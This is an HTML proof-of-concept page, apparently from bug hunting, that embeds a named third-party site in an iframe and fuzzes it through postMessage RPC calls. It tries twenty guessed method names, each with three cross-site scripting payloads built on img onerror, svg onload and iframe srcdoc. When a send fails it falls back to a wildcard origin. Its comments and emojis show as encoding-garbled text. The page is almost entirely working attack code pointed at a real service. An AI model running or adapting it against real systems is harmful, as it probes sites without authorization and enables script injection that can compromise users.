<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>ğŸš¨ RPC XSS PoC</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      max-width: 900px;
      margin: 0 auto;
      padding: 20px;
    }
    iframe {
      border: 2px solid #ff0000;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <h2>ğŸš€ RPC PoC for Toloka iframe</h2>
  <iframe id="evil" src="https://tb.toloka.dev/" width="100%" height="600"></iframe>

  <script>
    const iframeEl = document.getElementById("evil");
    const targetOrigin = "https://tb.toloka.dev";
    const iframeMethods = [
      "renderMarkdown", "loadPreview", "getPreview", "injectTemplate",
      "parseHTML", "setContent", "showMarkdown", "convert",
      "previewTemplate", "parseTemplate", "display", "loadMarkdown",
      "send", "getMessage", "reply", "getData", "read", "getText",
      "render", "echo"
    ];

    const payloads = [
      `<img src=x onerror="alert('XSS via RPC')">`,
      `<svg/onload="alert('XSS Successful')">`,
      `<iframe srcdoc="<script>alert('XSS in iframe')<\/script>">`
    ];

    let rpcIdCounter = 1;
    let testResults = [];

    // Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ø±Ø¯ÙˆØ¯ Ù…Ù† iframe
    window.addEventListener("message", (event) => {
      if (event.origin !== targetOrigin && !event.origin.includes("toloka.dev")) {
        console.warn(`[âš ï¸] Received message from untrusted origin: ${event.origin}`);
        return;
      }

      console.log(`[ğŸ“©] Received reply from ${event.origin}:`, event.data);
      
      // ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ù†ØªØ§Ø¦Ø¬ Ù„Ù„ØªØ­Ù„ÙŠÙ„ Ù„Ø§Ø­Ù‚Ø§Ù‹
      if (event.data && event.data.id) {
        testResults.push({
          id: event.data.id,
          method: event.data.method,
          result: event.data.result,
          error: event.data.error,
          origin: event.origin
        });
      }
    });

    // Ø¥Ø±Ø³Ø§Ù„ Ø·Ù„Ø¨Ø§Øª RPC
    function sendRpcRequest(method, payload) {
      const rpcId = `xss-test-${rpcIdCounter++}`;
      
      const message = {
        type: "RPC",
        method: method,
        id: rpcId,
        params: [payload]
      };

      console.log(`[ğŸš€] Sending RPC: method=${method}, id=${rpcId}`);
      
      try {
        iframeEl.contentWindow.postMessage(message, targetOrigin);
      } catch (e) {
        console.error(`[âŒ] Failed to send RPC to ${method}:`, e);
        // Fallback Ø¥Ù„Ù‰ origin Ø¹Ø§Ù… Ø¥Ø°Ø§ ÙØ´Ù„
        iframeEl.contentWindow.postMessage(message, "*");
      }
    }

    // Ø¹Ù†Ø¯ ØªØ­Ù…ÙŠÙ„ iframe
    iframeEl.addEventListener("load", () => {
      console.log("âœ… iframe loaded, starting RPC fuzzing...");
      
      // Ø§Ø®ØªØ¨Ø§Ø± ÙƒÙ„ Ø¯Ø§Ù„Ø© Ù…Ø¹ ÙƒÙ„ payload
      iframeMethods.forEach(method => {
        payloads.forEach(payload => {
          setTimeout(() => {
            sendRpcRequest(method, payload);
          }, 100 * rpcIdCounter); // ØªØ£Ø®ÙŠØ± ØªØ¯Ø±ÙŠØ¬ÙŠ Ø¨ÙŠÙ† Ø§Ù„Ø·Ù„Ø¨Ø§Øª
        });
      });
    });

    // ÙˆØ¸ÙŠÙØ© Ù…Ø³Ø§Ø¹Ø¯Ø© Ù„Ø¹Ø±Ø¶ Ø§Ù„Ù†ØªØ§Ø¦Ø¬
    function showResults() {
      console.table(testResults);
      alert(`ØªÙ… Ø¥ÙƒÙ…Ø§Ù„ ${testResults.length} Ø§Ø®ØªØ¨Ø§Ø± RPC. Ø±Ø§Ø¬Ø¹ Ø§Ù„ÙƒÙˆÙ†Ø³ÙˆÙ„ Ù„Ù„ØªÙØ§ØµÙŠÙ„.`);
    }

    // Ø¹Ø±Ø¶ Ø§Ù„Ù†ØªØ§Ø¦Ø¬ Ø¨Ø¹Ø¯ 10 Ø«ÙˆØ§Ù†ÙŠ
    setTimeout(showResults, 10000);
  </script>
</body>
</html>
